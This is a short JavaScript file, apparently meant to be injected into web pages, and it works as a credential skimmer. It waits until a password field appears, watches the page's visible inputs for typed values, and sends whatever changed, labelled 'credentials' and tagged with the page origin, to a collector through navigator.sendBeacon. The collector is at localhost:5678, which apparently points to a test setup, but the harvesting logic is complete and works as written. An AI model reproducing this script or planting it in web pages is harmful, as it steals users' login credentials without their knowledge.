function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getAllInputs() {
    const inputs = [];
    document.querySelectorAll("input").forEach(input => {
        if (input.getAttribute("type") !== "hidden") {
            inputs.push([input, input.value]);
        }
    });
    return inputs;
}

async function main() {
    console.log("[main]");
    const inputs = getAllInputs(), credentials = [];

    await waitForDiff(inputs);

    for (let [input, oldValue] of inputs) {
        if (input.value != oldValue) {
            credentials.push(input.value);
        }
    }

    navigator.sendBeacon("http://localhost:5678", JSON.stringify({
        type: "credentials",
        payload: {
            origin: window.location.origin,
            credentials
        }
    }));
}

function waitForSelector(selector) {
    return new Promise(resolve => {
        let timer = setInterval(function () {
            if (document.querySelector(selector)) {
                resolve();
                clearInterval(timer);
            }
        });
    })
}

function waitForDiff(inputs) {
    return new Promise(resolve => {
        let timeout, timer;
        timeout = setTimeout(() => {
            resolve();
            clearTimeout(timeout);
            clearInterval(timer);
        }, 1500);
        timer = setInterval(function () {
            for (let [input, oldValue] of inputs) {
                if (input.value != oldValue) {
                    resolve();
                    clearTimeout(timeout);
                    clearInterval(timer);
                    break;
                }
            }
        });
    });
}

waitForSelector("input[type=password]").then(main);